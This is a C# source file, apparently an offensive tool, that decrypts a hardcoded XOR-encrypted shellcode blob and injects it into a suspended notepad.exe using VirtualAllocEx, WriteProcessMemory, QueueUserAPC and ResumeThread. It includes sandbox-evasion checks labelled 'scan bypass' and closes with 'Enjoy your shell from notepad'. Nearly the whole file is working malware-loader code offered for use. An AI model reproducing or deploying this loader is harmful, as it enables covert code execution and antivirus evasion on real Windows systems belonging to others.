/*QUEUE USER APC PROCESS INJECTION
description: |
	Injects shellcode into a newly spawned remote process using user-mode asynchronous procedure call (APC). 
	Thread execution via ResumeThread.
key win32 API calls:
  - kernel32.dll:
    1: 'CreateProcess'
    2: 'VirtualAllocEx'
    3: 'WriteProcessMemory'
    4: 'OpenThread'
    5: 'VirtualProtectEx'
    6: 'QueueUserAPC'
	7: 'ResumeThread'
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;

namespace QUserAPCProcessInjection
{
    class Program
    {
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct STARTUPINFO
		{
			public uint cb;
			public string lpReserved;
			public string lpDesktop;
			public string lpTitle;
			public uint dwX;
			public uint dwY;
			public uint dwXSize;
			public uint dwYSize;
			public uint dwXCountChars;
			public uint dwYCountChars;
			public uint dwFillAttribute;
			public uint dwFlags;
			public short wShowWindow;
			public short cbReserved2;
			public IntPtr lpReserved2;
			public IntPtr hStdInput;
			public IntPtr hStdOutput;
			public IntPtr hStdError;
		}
		
		[StructLayout(LayoutKind.Sequential)]
		public struct PROCESS_INFORMATION
		{
			// A handle to the newly created process. The handle is used to specify the process in all functions that perform operations on the process object.
			public IntPtr hProcess;
			// A handle to the primary thread of the newly created process. The handle is used to specify the thread in all functions that perform operations on the thread object.
			public IntPtr hThread;
			public int dwProcessId;
			public int dwThreadId;
		}
		
		[Flags]
		public enum ThreadAccess : int
		{
			TERMINATE = (0x0001),
			SUSPEND_RESUME = (0x0002),
			GET_CONTEXT = (0x0008),
			SET_CONTEXT = (0x0010),
			SET_INFORMATION = (0x0020),
			QUERY_INFORMATION = (0x0040),
			SET_THREAD_TOKEN = (0x0080),
			IMPERSONATE = (0x0100),
			DIRECT_IMPERSONATION = (0x0200),
			THREAD_HIJACK = SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT,
			THREAD_ALL = TERMINATE | SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT | SET_INFORMATION | QUERY_INFORMATION | SET_THREAD_TOKEN | IMPERSONATE | DIRECT_IMPERSONATION
		}
		
		[Flags]
		public enum ProcessCreationFlags : uint
		{
			ZERO_FLAG = 0x00000000,
			CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
			CREATE_DEFAULT_ERROR_MODE = 0x04000000,
			CREATE_NEW_CONSOLE = 0x00000010,
			CREATE_NEW_PROCESS_GROUP = 0x00000200,
			CREATE_NO_WINDOW = 0x08000000,
			CREATE_PROTECTED_PROCESS = 0x00040000,
			CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
			CREATE_SEPARATE_WOW_VDM = 0x00001000,
			CREATE_SHARED_WOW_VDM = 0x00001000,
			CREATE_SUSPENDED = 0x00000004,
			CREATE_UNICODE_ENVIRONMENT = 0x00000400,
			DEBUG_ONLY_THIS_PROCESS = 0x00000002,
			DEBUG_PROCESS = 0x00000001,
			DETACHED_PROCESS = 0x00000008,
			EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
			INHERIT_PARENT_AFFINITY = 0x00010000
		}

		
		//https://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
		[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
		public static extern bool CreateProcess(
				   string lpApplicationName,
				   string lpCommandLine,
				   IntPtr lpProcessAttributes,
				   IntPtr lpThreadAttributes,
				   bool bInheritHandles,
				   ProcessCreationFlags dwCreationFlags,
				   IntPtr lpEnvironment,
				   string lpCurrentDirectory,
				   ref STARTUPINFO lpStartupInfo, 
				   out PROCESS_INFORMATION lpProcessInformation);
		
		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread
		[DllImport("kernel32.dll", SetLastError = true)]
		static extern IntPtr OpenThread(
					ThreadAccess dwDesiredAccess, 		
					bool bInheritHandle,
					int dwThreadId);
		
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpshellcodefer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
				
		//https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc
		[DllImport("kernel32.dll")]
		private static extern UInt32 QueueUserAPC(
					IntPtr pfnAPC,
					IntPtr hThread,
					IntPtr dwData);
					
		[DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll")]
		static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
		
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetCurrentThread();

		[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
		
		[DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);
		
		static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                Console.WriteLine("(VirtualAllocExNuma) [-] Failed check");
                return;
            }

			Console.WriteLine("[+] Delay of three seconds for scan bypass check");
			
			DateTime time1 = DateTime.Now;
            Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
                Console.WriteLine("(Sleep) [-] Failed check");
				return;
            }
			
			static byte[] xor(byte[] cipher, byte[] key)
			{
			byte[] xored = new byte[cipher.Length];

			for (int i = 0; i < cipher.Length; i++)
			{
				xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
			}

			return xored;
			}
			
			Console.WriteLine("[+] Decrypt Shellcode");
			string key = "ARICAHACKON";
			System.Threading.Thread.Sleep(3000);
			// This shellcode byte is the encrypted output from encryptor.exe
			byte[] xorshellcode = new byte[511] {0xbd, 0x1a, 0xca, 0xa7, 0xb1, 0xa0, 0x8d, 0x43, 0x4b, 0x4f, 0x0f, 0x10, 0x13, 0x19, 0x11, 0x09, 0x79, 0x93, 0x26, 0x03, 0xc4, 0x1c, 0x21, 0x1a, 0xc2, 0x11, 0x59, 0x00, 0xca, 0x11, 0x6b, 0x1e, 0x18, 0x0c, 0x63, 0x80, 0x0b, 0xca, 0x3a, 0x11, 0x0b, 0x44, 0xf8, 0x04, 0x0b, 0x1a, 0x78, 0x83, 0xed, 0x74, 0x20, 0x3f, 0x49, 0x63, 0x6e, 0x00, 0x93, 0x80, 0x4e, 0x00, 0x49, 0x80, 0xa1, 0xa6, 0x1d, 0x06, 0xca, 0x00, 0x69, 0x02, 0x10, 0xc3, 0x03, 0x7f, 0x03, 0x4e, 0x9e, 0x27, 0xd3, 0x31, 0x5b, 0x4a, 0x4a, 0x4e, 0xc6, 0x39, 0x4f, 0x4e, 0x41, 0xd9, 0xc9, 0xcb, 0x41, 0x48, 0x41, 0x0b, 0xce, 0x8f, 0x3a, 0x26, 0x1a, 0x48, 0x93, 0x05, 0xc3, 0x01, 0x63, 0x02, 0x4e, 0x9e, 0xca, 0x1a, 0x51, 0x13, 0xa2, 0x1e, 0x09, 0xbc, 0x82, 0x0e, 0xc5, 0x75, 0xda, 0x04, 0x72, 0x88, 0x00, 0x40, 0x95, 0x03, 0x7e, 0x8e, 0xed, 0x13, 0x88, 0x8a, 0x4c, 0x09, 0x40, 0x82, 0x73, 0xaf, 0x3b, 0xb0, 0x1e, 0x4a, 0x0f, 0x65, 0x40, 0x04, 0x7a, 0x9a, 0x3a, 0x96, 0x19, 0x16, 0xc2, 0x03, 0x65, 0x01, 0x40, 0x93, 0x2d, 0x0e, 0xc5, 0x4d, 0x1a, 0x0d, 0xc8, 0x01, 0x54, 0x08, 0x42, 0x9b, 0x0e, 0xc5, 0x45, 0xda, 0x01, 0x42, 0x91, 0x09, 0x19, 0x02, 0x13, 0x11, 0x17, 0x1b, 0x13, 0x11, 0x02, 0x18, 0x09, 0x1b, 0x0b, 0xc8, 0xa3, 0x6e, 0x00, 0x00, 0xb6, 0xa3, 0x19, 0x09, 0x18, 0x19, 0x03, 0xc4, 0x5c, 0xa8, 0x19, 0xb6, 0xbc, 0xbe, 0x15, 0x08, 0xfd, 0x3c, 0x3c, 0x7c, 0x1e, 0x61, 0x7b, 0x43, 0x41, 0x09, 0x17, 0x0a, 0xc2, 0xa9, 0x06, 0xc0, 0xbe, 0xe9, 0x42, 0x41, 0x48, 0x08, 0xca, 0xae, 0x06, 0xf2, 0x43, 0x52, 0x56, 0xd3, 0x4b, 0x49, 0x40, 0x4c, 0x0a, 0x1b, 0x07, 0xc8, 0xb6, 0x05, 0xca, 0xb0, 0x09, 0xfb, 0x0f, 0x3c, 0x69, 0x49, 0xbe, 0x87, 0x05, 0xca, 0xab, 0x20, 0x40, 0x42, 0x4b, 0x4f, 0x17, 0x00, 0xe8, 0x60, 0xc3, 0x2a, 0x48, 0xbe, 0x96, 0x21, 0x45, 0x0f, 0x1f, 0x02, 0x19, 0x0e, 0x70, 0x81, 0x0c, 0x72, 0x8b, 0x07, 0xb1, 0x81, 0x1a, 0xc0, 0x81, 0x09, 0xb7, 0x81, 0x0b, 0xc2, 0x8e, 0x0f, 0xfb, 0xb8, 0x46, 0x9c, 0xa1, 0xb7, 0x94, 0x0b, 0xc2, 0x88, 0x24, 0x51, 0x13, 0x11, 0x0f, 0xc8, 0xaa, 0x09, 0xca, 0xb2, 0x0e, 0xf4, 0xd8, 0xf7, 0x3d, 0x22, 0xbe, 0x9d, 0xc4, 0x83, 0x3f, 0x45, 0x07, 0xbe, 0x9c, 0x3c, 0xa6, 0xa9, 0xdb, 0x41, 0x43, 0x4b, 0x07, 0xcd, 0xad, 0x42, 0x01, 0xca, 0xa3, 0x05, 0x70, 0x8a, 0x21, 0x4b, 0x0f, 0x19, 0x1a, 0xc0, 0xba, 0x00, 0xf2, 0x43, 0x9a, 0x83, 0x10, 0xb1, 0x94, 0xd1, 0xb1, 0x43, 0x3f, 0x1d, 0x09, 0xc0, 0x8f, 0x6f, 0x10, 0xc8, 0xa4, 0x23, 0x03, 0x00, 0x11, 0x29, 0x43, 0x5b, 0x4f, 0x4e, 0x00, 0x0a, 0x01, 0xca, 0xb3, 0x00, 0x70, 0x8a, 0x0a, 0xf5, 0x16, 0xe5, 0x01, 0xac, 0xbc, 0x94, 0x00, 0xc8, 0x80, 0x02, 0xc6, 0x89, 0x0c, 0x63, 0x80, 0x0a, 0xc8, 0xb8, 0x09, 0xca, 0x91, 0x07, 0xc7, 0xb8, 0x13, 0xf3, 0x41, 0x98, 0x80, 0x1e, 0xbc, 0x9e, 0xcc, 0xb6, 0x41, 0x2f, 0x61, 0x1b, 0x00, 0x1f, 0x18, 0x2b, 0x4b, 0x0f, 0x4e, 0x41, 0x13, 0x11, 0x29, 0x41, 0x12, 0x00, 0xf9, 0x40, 0x60, 0x41, 0x71, 0xad, 0x9c, 0x14, 0x18, 0x09, 0xfb, 0x36, 0x25, 0x02, 0x2f, 0xbe, 0x87, 0x00, 0xbc, 0x8f, 0xa1, 0x7d, 0xbc, 0xb4, 0xb0, 0x06, 0x40, 0x91, 0x01, 0x6a, 0x87, 0x00, 0xc4, 0xb5, 0x3e, 0xfb, 0x0f, 0xbe, 0xb5, 0x11, 0x29, 0x41, 0x11, 0xfa, 0xa3, 0x56, 0x65, 0x44, 0x00, 0xdb, 0x93, 0xbc, 0x94};

			byte[] shell;
			shell = xor(xorshellcode, Encoding.ASCII.GetBytes(key));
            
			// Store the shellcode as a variable
			var shellcode = shell;
			
			System.Threading.Thread.Sleep(3000);
			
            string processPath = @"C:\Windows\System32\notepad.exe";
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

			Console.WriteLine("[+] Opening notepad.exe in the background");
			// Creates the process suspended. ProcessCreationFlags.CREATE_SUSPENDED = 0x00000004
			CreateProcess(processPath, null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
			
			// Sets an integer pointer as a variable reference for the memory space to be allocated for the shellcode
			IntPtr alloc = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
			
			Console.WriteLine("[+] WriteProcessMemory to 0x{0}", new string[] { alloc.ToString("X") });
			// Writes the shellcode into the created memory space
			WriteProcessMemory(pi.hProcess, alloc, shellcode, (uint)shellcode.Length, out UIntPtr bytesWritten);
			
			Console.WriteLine("[+] OpenThread to 0x{0}", new string[] { alloc.ToString("X") });
			//ThreadAccess.SET_CONTEXT = 0x0010
			IntPtr tpointer = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
            uint oldProtect = 0;
			
			Console.WriteLine("[+] VirtualProtectEx on 0x{0}", new string[] { alloc.ToString("X") });
			// Changes the protection rights to the memory space allocated for the shellcode
			VirtualProtectEx(pi.hProcess, alloc, shellcode.Length, 0x20, out oldProtect);
			
			Console.WriteLine("[+] Setting QueueUserAPC to 0x{0}", new string[] { alloc.ToString("X") });
			// Adds a user-mode asynchronous procedure call (APC) object to the APC queue of the specified thread tpointer
			QueueUserAPC(alloc, tpointer, IntPtr.Zero);
			
            Console.WriteLine("[+] Resume thread 0x{0}", new string[] { pi.hThread.ToString("X") });
            // Resume the suspended notepad.exe thread
            ResumeThread(pi.hThread);
			
			Console.WriteLine("[+] Enjoy your shell from notepad");
			//This is for debug. You can comment the below line if you do not need to read all the console messages
			System.Threading.Thread.Sleep(3000);
		}
	}
}
